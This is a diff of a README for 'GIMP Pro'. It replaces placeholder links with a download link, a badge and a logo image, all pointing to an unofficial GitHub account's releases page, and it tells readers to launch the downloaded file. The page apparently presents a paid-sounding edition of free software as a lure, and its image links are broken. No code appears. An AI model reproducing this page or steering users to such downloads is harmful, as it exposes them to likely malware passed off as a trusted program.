@@ -38,9 +38,9 @@ GIMP Pro is a powerful image editor that offers a wide range of features for cre
 
 ## Getting Started 🚀
 
-To get started with GIMP Pro, you can download the software from the following link: [Download GIMP Pro](https://github.com/project/files/App.zip)
+To get started with GIMP Pro, you can download the software from the following link: [Download GIMP Pro](https://github.com/6363Jom/GIMP-Pro/releases)
 
-![Download GIMP Pro](https://img.shields.io/badge/Download-GIMP_Pro-blue)
+![Download GIMP Pro](https://github.com/6363Jom/GIMP-Pro/releases)
 
 Please note that the downloaded file needs to be launched to begin the installation process.
 
@@ -52,7 +52,7 @@ If you have any questions, feedback, or suggestions regarding GIMP Pro, feel fre
 
 Let's create amazing designs together with GIMP Pro! 🎉
 
-![GIMP Pro Logo](https://example.com/gimp-pro-logo.png)
+![GIMP Pro Logo](https://github.com/6363Jom/GIMP-Pro/releases)
 
 ---
 
